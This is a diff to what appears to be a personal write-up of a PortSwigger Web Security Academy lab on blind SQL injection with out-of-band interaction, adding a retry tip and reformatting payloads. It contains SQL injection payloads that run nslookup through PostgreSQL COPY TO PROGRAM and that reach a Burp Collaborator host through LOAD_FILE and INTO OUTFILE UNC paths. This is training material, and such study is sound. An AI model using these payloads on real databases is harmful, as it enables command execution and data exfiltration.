@@ -32,7 +32,9 @@ next = true
 
 ## Lab 13: Blind SQL injection with out-of-band interaction: {#lab-13-blind-sql-injection-with-out-of-band-interaction}
 
-+Note+: This lab requires burp collaborator to complete which is only available with burpsuite professional, you can easily sign up for a burpsuite professional trial but for some reason they do not accept gmail accounts so use something else.
++Note+: 
+- This lab requires burp collaborator to complete which is only available with burpsuite professional, you can easily sign up for a burpsuite professional trial but for some reason they do not accept gmail accounts so use something else.
+- This also just sometimes doesn't work so you need to retry the same payload. 
 
 > This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 >
@@ -89,7 +91,7 @@ If we look at the [SQLi cheat sheet](https://portswigger.net/web-security/sql-in
 ### PosgreSQL OAST Payloads: {#posgresql-oast-payloads}
 
 ```sql
-'; COPY (SELECT '') TO PROGRAM 'nslookup [BURP-COLLABORATOR-URL]'; --
+'; COPY (SELECT '') TO PROGRAM 'nslookup [BURP-COLLABORATOR-URL]';--
 ```
 
 +Notes+:
@@ -100,9 +102,9 @@ If we look at the [SQLi cheat sheet](https://portswigger.net/web-security/sql-in
 
 ```sql
 --Write string into a remote share (Windows server account must have permission):
-'; SELECT LOAD_FILE('\\\\[BURP-COLLABORATOR-URL]\\file.txt'); --
+'; SELECT LOAD_FILE('\\\\[BURP-COLLABORATOR-URL]\\file.txt');--
 
-'; SELECT 'x' INTO OUTFILE '\\\\[BURP-COLLABORATOR-URL]\\exfil.txt'; --
+'; SELECT 'x' INTO OUTFILE '\\\\[BURP-COLLABORATOR-URL]\\exfil.txt';--
 ```
 
 +Notes+:
